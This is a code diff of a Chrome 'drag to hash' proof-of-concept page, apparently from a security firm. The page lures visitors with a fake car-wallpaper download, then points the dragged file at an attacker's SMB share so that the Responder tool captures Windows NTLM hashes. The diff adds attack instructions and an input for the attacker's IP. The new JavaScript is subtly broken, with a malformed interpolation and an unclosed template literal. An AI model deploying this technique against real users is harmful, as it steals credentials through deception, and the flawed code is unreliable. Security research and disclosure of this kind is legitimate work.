@@ -4,14 +4,21 @@
 </head>
 <body>
 	<h1>TrustedSec Chrome Drag to Hash POC</h1>
+	<b><i>Instructions</i></b>
+	<p>Open this page on a Windows system in a chromium based browser</p>
+	<p>Run Responder on a system that the Windows computer can send SMB requests to</p>
+	<p>Enter the IP address of your Responder server below:</p>
+	<input type="text" id="responder-ip" placeholder="e.g., 10.0.0.5">
+	<p>Then you need to drag the image below to your desktop, and when Chrome fails hit the try again button in the downloads list</p>
+	<p>You should then have your hash captured in Responder</p>
 
 	<h2>Epic Desktop Wallpaper for car lovers!</h2>
 	<i>Drag the image to your desktop to save the wallpaper!</i>
 	<br><br>
 
-	<img id="dragimg" src="/dragRacer.jpg"
+	<img id="dragimg" src="/dragnhash.png"
 	draggable="true"
-	style="cursor: grab;">
+	style="cursor: grab; width: 500px;">
 
 	<script type="text/javascript">
 		let dragging = false;
@@ -21,10 +28,12 @@
 		element.addEventListener('dragstart', (e) => {
 			dragging = true;
 
+			const ip = document.getElementById('responder-ip').value.trim() || "127.0.0.1";
+			const sharePath = `file://${ip}/SHARE/dragnhash.png`;
 			// This is the magic that points to our Responder hoping to snag hashes
-			e.dataTransfer.setData("DownloadURL", `image/png:dragRacer.jpg:file://10.211.55.9/SHARE/dragRacer.jpg`);
+			e.dataTransfer.setData("DownloadURL", `image/png:dragnhash.png:${{sharePath}}`);
 
-			console.log("Dragging image file!");
+			console.log(`Dragging image file to ${sharePath`);
 		});
 
 
@@ -34,13 +43,13 @@
 				console.log("Mouse has returned after dragging!");
 				dragging = false;
 
-				fetch('/dragRacer.jpg')
+				fetch('/dragnhash.png')
 				.then(res => res.blob())
 				.then(blob => {
 					const url = URL.createObjectURL(blob);
 					const a = document.createElement('a');
 					a.href = url;
-					a.download = 'dragRacer.jpg';
+					a.download = 'dragnhash.png';
 					document.body.appendChild(a);
 					a.click();
 					document.body.removeChild(a);
